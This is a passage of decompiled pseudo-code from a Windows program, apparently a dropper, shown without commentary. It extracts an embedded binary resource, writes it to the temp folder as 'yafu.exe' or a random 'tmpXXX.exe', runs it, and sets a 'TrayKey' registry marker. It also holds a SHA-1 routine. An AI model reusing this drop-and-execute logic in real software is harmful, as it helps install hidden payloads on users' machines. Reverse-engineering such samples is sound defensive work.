  ppFStack_1018 = (FILE **)0x0;
  uStack_101c = 4;
  local_1008 = param_1;
  iVar1 = Ordinal_16(*unaff_EDI,local_100c);
  if (iVar1 != 4) {
    ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_101c);
    return;
  }
  if (uStack_101c != 0) {
    do {
      _Count = Ordinal_16(*unaff_EDI,&stack0xffffefec,0x1000,0);
      if (_Count == 0) break;
      _fwrite(&stack0xffffefec,1,_Count,*ppFStack_1018);
      uVar2 = uVar2 + _Count;
    } while (uVar2 < uStack_101c);
  }
  _fclose(*ppFStack_1018);
  ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_101c);
  return;
}



void FUN_004045b0(void)

{
  short sVar1;
  HANDLE pvVar2;
  LSTATUS LVar3;
  short *psVar4;
  int iVar5;
  void *pvVar6;
  short *psVar7;
  HKEY unaff_EBX;
  LPCWSTR dwMilliseconds;
  HKEY local_250;
  DWORD local_24c;
  DWORD local_248;
  DWORD local_244;
  short sStack_240;
  undefined auStack_23e [2];
  WCHAR local_23c;
  undefined4 local_23a;
  undefined4 local_236;
  undefined4 local_232;
  undefined4 local_22e;
  undefined4 local_22a;
  undefined4 local_226;
  undefined4 local_222;
  undefined4 local_21e;
  undefined4 local_21a;
  undefined2 local_216;
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&local_250;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_23a = 0;
  local_236 = 0;
  local_232 = 0;
  local_22e = 0;
  local_22a = 0;
  local_226 = 0;
  local_222 = 0;
  local_21e = 0;
  local_21a = 0;
  local_216 = 0;
  local_23c = L'\0';
  local_248 = 0;
  local_244 = 0x104;
  psVar7 = &DAT_004375e8;
  do {
    psVar4 = psVar7;
    psVar7 = psVar4 + 1;
  } while (*psVar4 != 0);
  if (((int)(psVar4 + -0x21baf4) >> 1 == 0) ||
     (pvVar2 = OpenEventW(0x20000,0,&DAT_004375e8), pvVar2 == (HANDLE)0x0)) {
    LVar3 = RegOpenKeyExW((HKEY)0x80000001,
                          L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",0,0xf003f,
                          &local_250);
    if (LVar3 == 0) {
      LVar3 = RegQueryValueExW(local_250,L"TrayKey",(LPDWORD)0x0,&local_248,(LPBYTE)&local_23c,
                               &local_244);
      if ((LVar3 == 0) && (pvVar2 = OpenEventW(0x20000,0,&local_23c), pvVar2 != (HANDLE)0x0)) {
        RegCloseKey(local_250);
        goto LAB_00404825;
      }
      RegCloseKey(local_250);
    }
    local_24c = 0;
    GetTempPathW(0x104,&local_214);
    psVar7 = &DAT_00437608;
    do {
      psVar4 = psVar7;
      psVar7 = psVar4 + 1;
    } while (*psVar4 != 0);
    if ((int)(psVar4 + -0x21bb04) >> 1 == 0) {
      _wcscat_s(&local_214,0x104,L"yafu");
      iVar5 = 0;
      do {
        sVar1 = *(short *)((int)&DAT_0042c958 + iVar5);
        *(short *)((int)&local_23c + iVar5) = sVar1;
        iVar5 = iVar5 + 2;
      } while (sVar1 != 0);
    }
    else {
      _wcscat_s(&local_214,0x104,&DAT_00437608);
      iVar5 = 0;
      do {
        sVar1 = *(short *)((int)&DAT_00437608 + iVar5);
        *(short *)((int)&local_23c + iVar5) = sVar1;
        iVar5 = iVar5 + 2;
      } while (sVar1 != 0);
    }
    _wcscat_s(&local_214,0x104,L".exe");
    pvVar6 = FUN_00404840(&local_24c);
    if (pvVar6 != (void *)0x0) {
      dwMilliseconds = &local_214;
      FUN_004048b0(dwMilliseconds,pvVar6);
      Sleep((DWORD)dwMilliseconds);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,(LPCWSTR)((int)&local_21a + 2),L"",(LPCWSTR)0x0,1);
      LVar3 = RegOpenKeyExW((HKEY)0x80000001,
                            L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",0,3,
                            (PHKEY)&stack0xfffffdac);
      if (LVar3 == 0) {
        psVar7 = &sStack_240;
        do {
          sVar1 = *psVar7;
          psVar7 = psVar7 + 1;
        } while (sVar1 != 0);
        LVar3 = RegSetValueExW(unaff_EBX,L"TrayKey",0,1,(BYTE *)&sStack_240,
                               ((int)psVar7 - (int)auStack_23e >> 1) * 2 + 2);
        if (LVar3 == 0) {
          RegCloseKey(unaff_EBX);
        }
      }
      FUN_0040a3fc(pvVar6);
    }
  }
LAB_00404825:
  ___security_check_cookie_4(local_8 ^ (uint)&local_250);
  return;
}



void * __cdecl FUN_00404840(DWORD *param_1)

{
  HMODULE hModule;
  HRSRC hResInfo;
  DWORD _Size;
  HGLOBAL hResData;
  LPVOID _Src;
  void *_Dst;
  
  hModule = GetModuleHandleW((LPCWSTR)0x0);
  hResInfo = FindResourceW(hModule,(LPCWSTR)0x89,L"IDR_BINARY");
  if (hResInfo != (HRSRC)0x0) {
    _Size = SizeofResource(hModule,hResInfo);
    hResData = LoadResource(hModule,hResInfo);
    _Src = LockResource(hResData);
    *param_1 = _Size;
    _Dst = (void *)FUN_0040a3f1(_Size);
    _memset(_Dst,0,_Size);
    _memcpy(_Dst,_Src,_Size);
    return _Dst;
  }
  return (void *)0x0;
}



undefined8 __cdecl FUN_004048b0(LPCWSTR param_1,undefined4 param_2)

{
  void *pvVar1;
  int in_EAX;
  DWORD DVar2;
  void *lpBuffer;
  int iVar3;
  HANDLE hFile;
  BOOL BVar4;
  uint uVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint extraout_EDX_01;
  undefined8 uVar6;
  ulonglong uVar7;
  void *pvStack_8;
  uint uStack_4;
  
  DVar2 = GetFileAttributesW(param_1);
  if (DVar2 != 0xffffffff) {
    uVar6 = FUN_004049c0();
    if ((int)uVar6 == in_EAX) {
      return CONCAT44((int)((ulonglong)uVar6 >> 0x20),1);
    }
  }
  lpBuffer = _malloc(0x200000);
  pvStack_8 = (void *)0x200000;
  iVar3 = FUN_00404a20(in_EAX,&pvStack_8,param_2,lpBuffer);
  if (iVar3 != 0) {
    DVar2 = GetTickCount();
    FUN_00414927(DVar2);
    uStack_4 = _rand();
    uVar7 = FUN_00418930(extraout_ECX,extraout_EDX);
    pvVar1 = pvStack_8;
    FUN_004028c0();
    DVar2 = (int)uVar7 + (int)pvVar1;
    hFile = FUN_00404ba0();
    if (hFile != (HANDLE)0xffffffff) {
      BVar4 = WriteFile(hFile,lpBuffer,DVar2,&uStack_4,(LPOVERLAPPED)0x0);
      uVar5 = -(uint)(BVar4 != 0) & uStack_4;
      CloseHandle(hFile);
      if (uVar5 == DVar2) {
        _free(lpBuffer);
        return CONCAT44(extraout_EDX_00,1);
      }
    }
  }
  _free(lpBuffer);
  return (ulonglong)extraout_EDX_01 << 0x20;
}



undefined8 FUN_004049c0(void)

{
  LPCWSTR in_EAX;
  HANDLE hFile;
  BOOL BVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  LARGE_INTEGER LStack_c;
  
  hFile = CreateFileW(in_EAX,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    return 0xffffffffffffffff;
  }
  BVar1 = GetFileSizeEx(hFile,&LStack_c);
  uVar2 = -1;
  uVar3 = 0xffffffff;
  if (BVar1 == 1) {
    uVar2 = LStack_c.s.HighPart;
    uVar3 = LStack_c.s.LowPart;
  }
  CloseHandle(hFile);
  return CONCAT44(uVar2,uVar3);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00404a20(undefined4 param_1,void **param_2,undefined4 param_3,void *param_4)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  undefined4 uStack_244;
  void **local_240;
  int local_23c;
  undefined2 local_238;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  void *local_10;
  uint local_8;
  uint uStack_4;
  
  local_8 = DAT_00432c20 ^ (uint)&uStack_244;
  local_240 = param_2;
  piVar3 = FUN_0040a2b0(param_3,param_1);
  if (piVar3 != (int *)0x0) {
    if (*piVar3 == 1) {
      piVar1 = (int *)piVar3[1];
      if (*(uint *)(*piVar1 + 4) < 0x80000000) {
        if (piVar1[1] != -1) {
          FUN_00409910();
          param_2 = local_240;
        }
        piVar1[1] = -1;
        local_30 = 0;
        local_2c = 0;
        local_28 = 0;
        local_24 = 0;
        local_20 = 0;
        local_1c = 0;
        local_18 = 0;
        local_14 = 0;
        _DAT_00437d40 = 0;
      }
      else {
        _DAT_00437d40 = 0x10000;
      }
    }
    else {
      _DAT_00437d40 = 0x80000;
    }
    local_23c = 0;
    local_238 = 0;
    local_10 = (void *)0x0;
    if (*piVar3 == 1) {
      _DAT_00437d40 = FUN_00409b30((void *)piVar3[1],0,&local_23c);
    }
    else {
      _DAT_00437d40 = 0x80000;
    }
    if (*piVar3 == 1) {
      _DAT_00437d40 = FUN_0040a0f0(param_4,*param_2);
    }
    else {
      _DAT_00437d40 = 0x80000;
    }
    *param_2 = local_10;
    if (*piVar3 == 1) {
      iVar2 = piVar3[1];
      _DAT_00437d40 = FUN_0040a250();
      if (iVar2 != 0) {
        FUN_0040a360();
      }
      FUN_0040a3fc(piVar3);
    }
    else {
      _DAT_00437d40 = 0x80000;
    }
  }
  uStack_244 = 0x404b8a;
  ___security_check_cookie_4(uStack_4 ^ (uint)&local_240);
  return;
}



HANDLE FUN_00404ba0(void)

{
  DWORD DVar1;
  BOOL BVar2;
  HANDLE pvVar3;
  LPCWSTR unaff_ESI;
  
  DVar1 = GetFileAttributesW(unaff_ESI);
  if (DVar1 != 0xffffffff) {
    DVar1 = GetFileAttributesW(unaff_ESI);
    if (DVar1 != 0xffffffff) {
      if ((DVar1 & 1) != 0) {
        DVar1 = DVar1 ^ 1;
      }
      if ((DVar1 & 4) != 0) {
        DVar1 = DVar1 ^ 4;
      }
      if ((DVar1 & 2) != 0) {
        DVar1 = DVar1 ^ 2;
      }
      if ((DVar1 & 0x20) != 0) {
        DVar1 = DVar1 ^ 0x20;
      }
      SetFileAttributesW(unaff_ESI,DVar1);
      BVar2 = DeleteFileW(unaff_ESI);
      GetLastError();
      if (BVar2 != 0) goto LAB_00404bf3;
    }
    return (HANDLE)0xffffffff;
  }
LAB_00404bf3:
  pvVar3 = CreateFileW(unaff_ESI,0x40000000,1,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
  return pvVar3;
}



void __fastcall FUN_00404c10(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x14,param_3,&stack0x00000008);
  return;
}



void __fastcall FUN_00404c30(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



void __fastcall FUN_00404c50(undefined4 param_1,char *param_2,char *param_3)

{
  _vsprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00404c70(HINSTANCE param_1,undefined4 param_2,short *param_3)

{
  short sVar1;
  HWND pHVar2;
  DWORD DVar3;
  int iVar4;
  wchar_t wStack_218;
  undefined auStack_216 [522];
  uint local_c;
  
  local_c = DAT_00432c20 ^ (uint)&wStack_218;
  LoadStringW(param_1,0x67,(LPWSTR)&DAT_004371a8,100);
  LoadStringW(param_1,0x6d,(LPWSTR)&DAT_004370e0,100);
  FUN_00404e50();
  iVar4 = (int)&DAT_00437278 - (int)param_3;
  do {
    sVar1 = *param_3;
    *(short *)(iVar4 + (int)param_3) = sVar1;
    param_3 = param_3 + 1;
  } while (sVar1 != 0);
  DAT_00433fbc = FUN_00401000();
  Sleep(2000);
  iVar4 = FUN_00401100();
  if (iVar4 != 0) {
    FUN_00402910();
                    // WARNING: Subroutine does not return
    ExitProcess(0);
  }
  _DAT_00437270 = param_1;
  pHVar2 = CreateWindowExW(0,(LPCWSTR)&DAT_004370e0,(LPCWSTR)&DAT_004371a8,0xcf0000,-0x80000000,0,
                           -0x80000000,0,(HWND)0x0,(HMENU)0x0,param_1,(LPVOID)0x0);
  if (pHVar2 != (HWND)0x0) {
    iVar4 = FUN_00402ab0();
    if (iVar4 != 0) {
      wStack_218 = L'\0';
      _memset(auStack_216,0,0x206);
      if ((DAT_00437780 != 0) && (DAT_00437784 != 0)) {
        FUN_00403650(DAT_00437780);
        DAT_00433fb0 = DAT_00437784;
      }
      GetTickCount();
      FUN_00404fa0(1000,(wchar_t *)&DAT_00437b38,L"tmp8%X.exe");
      FUN_00403730();
      FUN_004036d0();
      _wcscat_s(&wStack_218,0x104,(wchar_t *)&DAT_0042c888);
      _wcscat_s(&wStack_218,0x104,(wchar_t *)&DAT_00437b38);
      DVar3 = GetFileAttributesW(&wStack_218);
      if (DVar3 != 0xffffffff) {
        Sleep(500);
        ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&wStack_218,L"",(LPCWSTR)0x0,1);
      }
      Sleep(5000);
      FUN_004045b0();
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&wStack_218);
  return;
}



void FUN_00404e50(void)

{
  HINSTANCE in_EAX;
  WNDCLASSEXW local_34;
  
  local_34.cbSize = 0x30;
  local_34.style = 3;
  local_34.lpfnWndProc = FUN_00404ee0;
  local_34.cbClsExtra = 0;
  local_34.cbWndExtra = 0;
  local_34.hInstance = in_EAX;
  local_34.hIcon = LoadIconW(in_EAX,(LPCWSTR)0x6b);
  local_34.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_34.hbrBackground = (HBRUSH)0x6;
  local_34.lpszMenuName = (LPCWSTR)0x6d;
  local_34.lpszClassName = (LPCWSTR)&DAT_004370e0;
  local_34.hIconSm = LoadIconW(local_34.hInstance,(LPCWSTR)0x6c);
  RegisterClassExW(&local_34);
  return;
}



void FUN_00404ee0(HWND param_1,UINT param_2,WPARAM param_3,LPARAM param_4)

{
  undefined auStack_54 [4];
  tagPAINTSTRUCT local_50;
  uint local_c;
  
  local_c = DAT_00432c20 ^ (uint)auStack_54;
  if (param_2 == 2) {
    PostQuitMessage(0);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  if (param_2 != 0xf) {
    if (param_2 != 0x111) {
      DefWindowProcW(param_1,param_2,param_3,param_4);
      ___security_check_cookie_4(local_c ^ (uint)auStack_54);
      return;
    }
    DefWindowProcW(param_1,0x111,param_3,param_4);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  BeginPaint(param_1,&local_50);
  EndPaint(param_1,&local_50);
  ___security_check_cookie_4(local_c ^ (uint)auStack_54);
  return;
}



void __fastcall FUN_00404fa0(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x104,param_3,&stack0x00000008);
  return;
}



void FUN_00404fc0(void)

{
  int in_EAX;
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  
  uVar1 = *(uint *)(in_EAX + 8);
  uVar3 = *(uint *)(in_EAX + 0xc);
  uVar7 = *(uint *)(in_EAX + 0x10);
  uVar5 = uVar3 >> 2 | uVar3 << 0x1e;
  uVar3 = (uVar1 >> 0x1b | uVar1 << 5) +
          ((*(uint *)(in_EAX + 0x14) ^ uVar7) & uVar3 ^ *(uint *)(in_EAX + 0x14)) +
          *(int *)(in_EAX + 0x18) + 0x5a827999 + *(int *)(in_EAX + 0x1c);
  uVar2 = *(int *)(in_EAX + 0x14) + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar5) & uVar1 ^ uVar7) +
          *(int *)(in_EAX + 0x20);
  uVar1 = uVar1 >> 2 | uVar1 << 0x1e;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar7 + 0x5a827999 +
          ((uVar5 ^ uVar1) & uVar3 ^ uVar5) +
          (uVar2 >> 0x1b | uVar2 * 0x20) + *(int *)(in_EAX + 0x24);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar5 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar4 ^ uVar1) & uVar2 ^ uVar1) +
          *(int *)(in_EAX + 0x28);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar1 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar4 ^ uVar6) & uVar3 ^ uVar4) +
          *(int *)(in_EAX + 0x2c) + 0x5a827999 + uVar1;
  uVar3 = uVar4 + 0x5a827999 +
          (uVar1 >> 0x1b | uVar1 * 0x20) + ((uVar6 ^ uVar7) & uVar2 ^ uVar6) +
          *(int *)(in_EAX + 0x30);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = uVar6 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar5) & uVar1 ^ uVar7) +
          *(int *)(in_EAX + 0x34);
  uVar7 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar5 ^ uVar4) & uVar3 ^ uVar5) +
          *(int *)(in_EAX + 0x38) + 0x5a827999 + uVar7;
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar5 + 0x5a827999 +
          ((uVar1 ^ uVar4) & uVar2 ^ uVar4) +
          (uVar7 >> 0x1b | uVar7 * 0x20) + *(int *)(in_EAX + 0x3c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar8 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar2 = uVar4 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar1 ^ uVar6) & uVar7 ^ uVar1) +
          *(int *)(in_EAX + 0x40);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar1 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar6 ^ uVar8) & uVar3 ^ uVar6) +
          *(int *)(in_EAX + 0x44) + 0x5a827999 + uVar1;
  uVar7 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = uVar6 + 0x5a827999 +
          (uVar1 >> 0x1b | uVar1 * 0x20) + ((uVar8 ^ uVar5) & uVar2 ^ uVar8) +
          *(int *)(in_EAX + 0x48);
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = uVar8 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar5 ^ uVar7) & uVar1 ^ uVar5) +
          *(int *)(in_EAX + 0x4c);
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x24) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar5 + 0x5a827999 +
          ((uVar4 ^ uVar7) & uVar3 ^ uVar7) +
          (uVar2 >> 0x1b | uVar2 * 0x20) + *(uint *)(in_EAX + 0x50);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar7 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar4 ^ uVar6) & uVar2 ^ uVar4) +
          *(int *)(in_EAX + 0x54);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar3 = uVar4 + 0x5a827999 +
          (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar6 ^ uVar5) & uVar3 ^ uVar6) +
          *(int *)(in_EAX + 0x58);
  uVar1 = uVar6 + 0x5a827999 +
          ((uVar5 ^ uVar7) & uVar2 ^ uVar5) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x20) = uVar2;
  uVar2 = uVar5 + 0x5a827999 +
          ((uVar7 ^ uVar4) & uVar3 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x24) = uVar3;
  uVar3 = uVar7 + 0x5a827999 +
          ((uVar6 ^ uVar4) & uVar1 ^ uVar4) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar5 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar1 = uVar4 + 0x5a827999 +
          ((uVar6 ^ uVar5) & uVar2 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar2;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar6 + 0x6ed9eba1 + (uVar5 ^ uVar4 ^ uVar3) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x30) = uVar3;
  uVar3 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar6 ^ uVar1) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar7 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x34) = uVar1;
  uVar1 = uVar4 + 0x6ed9eba1 + (uVar2 ^ uVar6 ^ uVar7) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x38) = uVar2;
  uVar2 = uVar6 + 0x6ed9eba1 + (uVar4 ^ uVar3 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar3;
  uVar3 = uVar7 + 0x6ed9eba1 + (uVar4 ^ uVar6 ^ uVar1) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x40) = uVar1;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x44) = uVar7;
  uVar2 = uVar4 + 0x6ed9eba1 + (uVar6 ^ uVar8 ^ uVar2) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar8 ^ uVar5 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar7;
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x48) = uVar3;
  uVar3 = uVar8 + 0x6ed9eba1 + (uVar2 ^ uVar5 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar3;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar2;
  uVar2 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar1 ^ uVar7) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x50) = uVar1;
  uVar1 = uVar7 + 0x6ed9eba1 + (uVar4 ^ uVar8 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x54) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x58) = uVar7;
  uVar3 = uVar4 + 0x6ed9eba1 + (uVar8 ^ uVar6 ^ uVar2) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar3;
  uVar2 = uVar8 + 0x6ed9eba1 + (uVar6 ^ uVar5 ^ uVar1) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar7;
  uVar7 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar3 ^ uVar5 ^ uVar7) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x20) = uVar3;
  uVar3 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar2 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar3;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x24) = uVar2;
  uVar2 = uVar7 + 0x6ed9eba1 + (uVar4 ^ uVar6 ^ uVar1) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
